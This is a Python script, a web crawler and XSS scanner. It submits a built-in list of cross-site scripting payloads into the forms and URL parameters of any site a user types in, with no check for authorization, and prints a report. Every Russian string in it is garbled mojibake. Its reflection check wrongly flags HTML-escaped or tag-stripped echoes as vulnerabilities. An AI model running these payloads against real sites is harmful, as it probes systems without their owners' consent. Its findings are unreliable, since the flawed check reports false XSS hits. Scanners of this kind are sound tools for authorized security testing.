import asyncio
import aiohttp
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from bs4 import BeautifulSoup
import re
import json
from datetime import datetime

class xss_scanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = {
            "—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã": [],
            "—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã": [],
            "—Ä–µ—Ñ–ª–µ–∫—Å—ã": [],
            "–ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã–µ_xss": [],
            "–æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ_—Å—Ç—Ä–∞–Ω–∏—Ü—ã": [],
            "—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞": {
                "–≤—Å–µ–≥–æ_—Ñ–æ—Ä–º": 0,
                "–≤—Å–µ–≥–æ_–ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤": 0,
                "–Ω–∞–π–¥–µ–Ω–æ_xss": 0,
                "—Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã": 0
            }
        }
        
        self.payloads = [
            "<script>alert('xss')</script>",
            "\"><script>alert('xss')</script>",
            "'><script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onload=alert('xss')",
            "onerror=alert('xss')",
            "onmouseover=alert('xss')",
            "onfocus=alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<svg/onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<details open ontoggle=alert('xss')>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>"
        ]
    
    async def fetch_page(self, url):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, ssl=False, timeout=10) as response:
                    if response.status == 200:
                        return await response.text()
        except:
            pass
        return None
    
    async def test_form_xss(self, form_info, page_url):
        try:
            action_url = form_info["action"]
            if not action_url.startswith(('http://', 'https://')):
                action_url = urljoin(page_url, action_url)
            
            method = form_info["method"].lower()
            inputs = form_info["inputs"]
            
            if not inputs:
                return None
            
            for payload in self.payloads[:5]:
                test_data = {}
                
                for inp in inputs:
                    input_name = inp["name"]
                    if inp["type"] in ["text", "textarea", "search", "email", "url"]:
                        test_data[input_name] = payload
                    else:
                        test_data[input_name] = inp.get("value", "test")
                
                async with aiohttp.ClientSession() as session:
                    if method == "get":
                        params = urlencode(test_data)
                        test_url = f"{action_url}?{params}"
                        async with session.get(test_url, ssl=False, timeout=15) as response:
                            content = await response.text()
                    else:
                        async with session.post(action_url, data=test_data, ssl=False, timeout=15) as response:
                            content = await response.text()
                    
                    if self.check_payload_reflection(content, payload):
                        return {
                            "—Ñ–æ—Ä–º–∞_url": page_url,
                            "action_url": action_url,
                            "–º–µ—Ç–æ–¥": method,
                            "payload": payload,
                            "–ø–æ–ª–µ_—Å_payload": next((inp["name"] for inp in inputs if inp["type"] in ["text", "textarea", "search"]), "–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                        }
        except:
            pass
        
        return None
    
    async def test_parameter_xss(self, url):
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        if not query_params:
            return []
        
        vulnerable_params = []
        
        for param_name in query_params.keys():
            for payload in self.payloads[:3]:
                test_params = query_params.copy()
                test_params[param_name] = [payload]
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(test_url, ssl=False, timeout=15) as response:
                            content = await response.text()
                            
                            if self.check_payload_reflection(content, payload):
                                vulnerable_params.append({
                                    "–ø–∞—Ä–∞–º–µ—Ç—Ä": param_name,
                                    "payload": payload,
                                    "test_url": test_url[:100] + "..." if len(test_url) > 100 else test_url,
                                    "—Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É–µ—Ç": True
                                })
                except:
                    pass
        
        return vulnerable_params
    
    def check_payload_reflection(self, content, payload):
        clean_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#x27;')
        
        if payload in content:
            return True
        
        if clean_payload in content:
            return True
        
        payload_no_tags = re.sub(r'<[^>]+>', '', payload)
        if payload_no_tags and payload_no_tags in content:
            return True
        
        return False
    
    def find_reflective_params(self, url, content):
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        reflective = []
        
        for param_name, param_values in query_params.items():
            for value in param_values:
                if value and value in content:
                    reflective.append({
                        "–ø–∞—Ä–∞–º–µ—Ç—Ä": param_name,
                        "–∑–Ω–∞—á–µ–Ω–∏–µ": value[:50],
                        "—Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É–µ—Ç": True,
                        "url": url[:80] + "..." if len(url) > 80 else url
                    })
        
        return reflective
    
    def extract_forms(self, html, page_url):
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_info = {
                "action": form.get('action', ''),
                "method": form.get('method', 'get').lower(),
                "inputs": []
            }
            
            if not form_info["action"]:
                form_info["action"] = page_url
            
            for inp in form.find_all(['input', 'textarea', 'select']):
                input_type = inp.get('type', 'text')
                input_name = inp.get('name', '')
                
                if input_name:
                    form_info["inputs"].append({
                        "name": input_name,
                        "type": input_type,
                        "value": inp.get('value', '')
                    })
            
            if form_info["inputs"]:
                forms.append(form_info)
        
        return forms
    
    async def crawl_for_forms_and_params(self, start_url, max_pages=10):
        visited = set()
        to_visit = [start_url]
        
        pages_scanned = 0
        
        while to_visit and pages_scanned < max_pages:
            url = to_visit.pop(0)
            
            if url in visited:
                continue
            
            visited.add(url)
            pages_scanned += 1
            
            print(f"—Å–∫–∞–Ω–∏—Ä—É—é [{pages_scanned}/{max_pages}]: {url[:60]}...")
            
            html = await self.fetch_page(url)
            
            if not html:
                continue
            
            page_info = {
                "url": url,
                "—Ñ–æ—Ä–º—ã": [],
                "–ø–∞—Ä–∞–º–µ—Ç—Ä—ã": [],
                "—Ä–µ—Ñ–ª–µ–∫—Å—ã": []
            }
            
            forms = self.extract_forms(html, url)
            page_info["—Ñ–æ—Ä–º—ã"] = [{"action": f["action"], "inputs_count": len(f["inputs"])} for f in forms]
            
            for form in forms:
                self.results["—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"]["–≤—Å–µ–≥–æ_—Ñ–æ—Ä–º"] += 1
                result = await self.test_form_xss(form, url)
                if result:
                    self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"].append(result)
                    self.results["—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"]["–Ω–∞–π–¥–µ–Ω–æ_xss"] += 1
            
            param_results = await self.test_parameter_xss(url)
            page_info["–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"] = [{"–ø–∞—Ä–∞–º–µ—Ç—Ä": p["–ø–∞—Ä–∞–º–µ—Ç—Ä"], "—É—è–∑–≤–∏–º": True} for p in param_results]
            
            if param_results:
                self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"].extend(param_results)
                self.results["—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"]["–Ω–∞–π–¥–µ–Ω–æ_xss"] += len(param_results)
            
            reflective = self.find_reflective_params(url, html)
            page_info["—Ä–µ—Ñ–ª–µ–∫—Å—ã"] = reflective
            self.results["—Ä–µ—Ñ–ª–µ–∫—Å—ã"].extend(reflective)
            self.results["—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"]["—Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"] += len(reflective)
            
            self.results["–æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ_—Å—Ç—Ä–∞–Ω–∏—Ü—ã"].append(page_info)
            
            soup = BeautifulSoup(html, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link.get('href')
                if href and href.startswith(('http://', 'https://')):
                    parsed = urlparse(href)
                    target_parsed = urlparse(start_url)
                    
                    if parsed.netloc == target_parsed.netloc and href not in visited:
                        to_visit.append(href)
            
            await asyncio.sleep(0.5)
    
    def print_results(self):
        print(f"\n{'='*80}")
        print(f"üîç –æ—Ç—á–µ—Ç xss —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è: {self.target_url}")
        print(f"{'='*80}")
        
        stats = self.results["—Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"]
        print(f"\nüìä —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:")
        print(f"   –æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ —Å—Ç—Ä–∞–Ω–∏—Ü: {len(self.results['–æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ_—Å—Ç—Ä–∞–Ω–∏—Ü—ã'])}")
        print(f"   –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ —Ñ–æ—Ä–º: {stats['–≤—Å–µ–≥–æ_—Ñ–æ—Ä–º']}")
        print(f"   —Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤: {stats['—Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã']}")
        print(f"   –Ω–∞–π–¥–µ–Ω–æ xss —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {stats['–Ω–∞–π–¥–µ–Ω–æ_xss']}")
        
        print(f"\n{'='*80}")
        
        if self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"]:
            print(f"\nüéØ —É—è–∑–≤–∏–º—ã–µ —Ñ–æ—Ä–º—ã ({len(self.results['—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã'])}):")
            for i, vuln in enumerate(self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"][:5], 1):
                print(f"   {i}. —Ñ–æ—Ä–º–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ: {vuln['—Ñ–æ—Ä–º–∞_url'][:50]}...")
                print(f"      –º–µ—Ç–æ–¥: {vuln['–º–µ—Ç–æ–¥']}, –ø–æ–ª–µ: {vuln['–ø–æ–ª–µ_—Å_payload']}")
                print(f"      payload: {vuln['payload'][:40]}...")
                print(f"      action: {vuln['action_url'][:60]}...")
        
        if self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"]:
            print(f"\nüéØ —É—è–∑–≤–∏–º—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã url ({len(self.results['—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã'])}):")
            for i, vuln in enumerate(self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"][:5], 1):
                print(f"   {i}. –ø–∞—Ä–∞–º–µ—Ç—Ä: {vuln['–ø–∞—Ä–∞–º–µ—Ç—Ä']}")
                print(f"      payload: {vuln['payload'][:40]}...")
                print(f"      test url: {vuln['test_url']}")
        
        if self.results["—Ä–µ—Ñ–ª–µ–∫—Å—ã"]:
            print(f"\nü™û —Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã ({len(self.results['—Ä–µ—Ñ–ª–µ–∫—Å—ã'])}):")
            seen = set()
            for i, refl in enumerate(self.results["—Ä–µ—Ñ–ª–µ–∫—Å—ã"][:5], 1):
                key = (refl['–ø–∞—Ä–∞–º–µ—Ç—Ä'], refl['–∑–Ω–∞—á–µ–Ω–∏–µ'])
                if key not in seen:
                    seen.add(key)
                    print(f"   {i}. {refl['–ø–∞—Ä–∞–º–µ—Ç—Ä']} = {refl['–∑–Ω–∞—á–µ–Ω–∏–µ']}")
                    print(f"      url: {refl['url']}")
        
        print(f"\n{'='*80}")
        print(f"üí° —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:")
        
        if self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"] or self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"]:
            print("   1. –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —Ç—Ä–µ–±—É—é—Ç —Ñ–∏–∫—Å–∞—Ü–∏–∏")
            print("   2. –ø—Ä–æ–≤–µ—Å—Ç–∏ –º–∞–Ω—É–∞–ª—å–Ω–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è")
            print("   3. –ø—Ä–æ–≤–µ—Ä–∏—Ç—å –¥—Ä—É–≥–∏–µ –ø–æ—Ö–æ–∂–∏–µ —Ñ–æ—Ä–º—ã –∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã")
        
        if self.results["—Ä–µ—Ñ–ª–µ–∫—Å—ã"] and not self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"] and not self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"]:
            print("   1. —Ä–µ—Ñ–ª–µ–∫—Ç–∏—Ä—É—é—â–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –µ—Å—Ç—å, –Ω–æ xss –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
            print("   2. –ø–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å –±–æ–ª–µ–µ —Å–ª–æ–∂–Ω—ã–µ payloads")
            print("   3. –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—é –Ω–∞ —Å—Ç–æ—Ä–æ–Ω–µ –∫–ª–∏–µ–Ω—Ç–∞")
        
        if not any([self.results["—É—è–∑–≤–∏–º—ã–µ_—Ñ–æ—Ä–º—ã"], self.results["—É—è–∑–≤–∏–º—ã–µ_–ø–∞—Ä–∞–º–µ—Ç—Ä—ã"], self.results["—Ä–µ—Ñ–ª–µ–∫—Å—ã"]]):
            print("   1. xss —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω–µ –Ω–∞–π–¥–µ–Ω–æ (—Ö–æ—Ä–æ—à–∏–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç)")
            print("   2. –ø—Ä–æ–≤–µ—Å—Ç–∏ –±–æ–ª–µ–µ –≥–ª—É–±–æ–∫–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä—É—á–Ω—É—é")
        
        print(f"\n{'='*80}")
        
        if self.results["–æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ_—Å—Ç—Ä–∞–Ω–∏—Ü—ã"]:
            print(f"\nüìÑ –ø—Ä–∏–º–µ—Ä—ã –æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ç—Ä–∞–Ω–∏—Ü:")
            for page in self.results["–æ—Ç—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ_—Å—Ç—Ä–∞–Ω–∏—Ü—ã"][:3]:
                print(f"   üåê {page['url'][:60]}...")
                print(f"      —Ñ–æ—Ä–º: {len(page['—Ñ–æ—Ä–º—ã'])}, –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤: {len(page['–ø–∞—Ä–∞–º–µ—Ç—Ä—ã'])}")
        
        print(f"\n{'='*80}")
        print(f"‚è± —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ: {datetime.now().strftime('%H:%M:%S')}")
        print(f"{'='*80}")

async def run_xss_scanner():
    target = input("\n–≤–≤–µ–¥–∏—Ç–µ url –¥–ª—è xss —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è -> ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    max_pages = input("–º–∞–∫—Å–∏–º—É–º —Å—Ç—Ä–∞–Ω–∏—Ü –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é 10) -> ").strip()
    max_pages = int(max_pages) if max_pages.isdigit() else 10
    
    print(f"\n–Ω–∞—á–∞—Ç–æ xss —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {target}")
    print(f"–º–∞–∫—Å–∏–º—É–º —Å—Ç—Ä–∞–Ω–∏—Ü: {max_pages}")
    print("–ø–æ–¥–æ–∂–¥–∏—Ç–µ...")
    
    scanner = xss_scanner(target)
    await scanner.crawl_for_forms_and_params(target, max_pages)
    
    scanner.print_results()
    
    save = input("\n—Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –æ—Ç—á–µ—Ç? (y/n) -> ").lower()
    if save == 'y':
        filename = f"xss_report_{urlparse(target).netloc}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(scanner.results, f, indent=2, ensure_ascii=False)
        print(f"–æ—Ç—á–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ {filename}")
